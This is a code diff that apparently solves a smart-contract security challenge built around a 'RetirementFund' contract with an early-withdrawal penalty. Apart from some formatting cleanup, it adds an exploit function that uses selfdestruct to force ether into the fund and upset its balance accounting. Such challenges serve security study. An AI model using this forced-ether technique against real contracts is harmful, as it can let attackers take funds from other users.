@@ -23,12 +23,10 @@ contract RetirementFund {
 
         if (block.timestamp < expiration) {
             // early withdrawal incurs a 10% penalty
-            (bool ok, ) = msg.sender.call{
-                value: (address(this).balance * 9) / 10
-            }("");
+            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
             require(ok, "Transfer to msg.sender failed");
         } else {
-            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+            (bool ok,) = msg.sender.call{value: address(this).balance}("");
             require(ok, "Transfer to msg.sender failed");
         }
     }
@@ -44,7 +42,7 @@ contract RetirementFund {
         }
 
         // penalty is what's left
-        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
@@ -57,5 +55,7 @@ contract ExploitContract {
         retirementFund = _retirementFund;
     }
 
-    // write your exploit functions below
+    function exploit() public payable {
+        selfdestruct(payable(address(retirementFund)));
+    }
 }
